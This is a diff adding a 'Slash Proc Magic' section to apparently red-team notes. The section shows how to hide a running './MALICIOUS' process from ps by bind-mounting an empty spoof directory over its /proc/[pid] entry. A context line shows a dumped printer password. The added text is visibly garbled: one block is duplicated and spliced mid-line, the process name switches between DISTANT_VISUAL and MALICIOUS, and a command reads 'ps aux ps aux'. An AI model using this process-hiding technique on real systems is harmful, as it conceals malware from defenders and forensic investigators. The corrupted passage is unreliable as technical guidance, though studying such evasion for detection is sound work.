@@ -1334,3 +1334,46 @@ Writing copy to nvram/printer
 ............................................S3cretPassw0rd......................
 ................................................................................
 ```
+
+## Slash Proc Magic
+
+Victim Host:
+
+```sh
+./MALICIOUS &
+```
+
+Using a process listing with ps, we can easily find the process, which would probably be noticed relatively quickly in a forensic investigation:
+
+```sh
+ps aux | grep DISTANT
+root     22665  0.1  0.3 709792  5520 [..] ./DISTANT_VISUAL
+root     22710  0.0  0.0 112808   968 [..] grep --color=auto M```sh
+./MALICIOUS &
+```
+
+Using a process listing with ps, we can easily find the process, which would probably be noticed relatively quickly in a forensic investigation:
+
+```sh
+ps aux ps aux | grep MALICIOUS
+root     22665  0.1  0.3 709792  5520 [..] ./MALICIOUS
+root     22710  0.0  0.0 112808   968 [..] grep --color=auto MALICIOUS
+```
+
+Creating the bind mount:
+
+```sh
+# This command creates a directory named spoof with a subdirectory fd
+mkdir -p spoof/fd;
+# This command mounts the spoof directory onto the /proc/[pid] directory. By doing this, it tricks the system into displaying the contents of the spoof directory when someone accesses the /proc/[pid] directory. By someone, we mean, for example, a tool like ps that relies heavily on the /proc/ directory to generate output (see the section strace (ps deep-dive), where we examine how the ps command works and why we can hide our binary in this simple way
+mount -o bind spoof /proc/22665;
+```
+
+Search for process again:
+
+```sh
+ps aux | grep MALICIOUS
+```
+
+By leveraging bind mounts to overlay a /proc/ directory, we demonstrated how a process can seemingly vanish from process listings while maintaining its functionality.
+
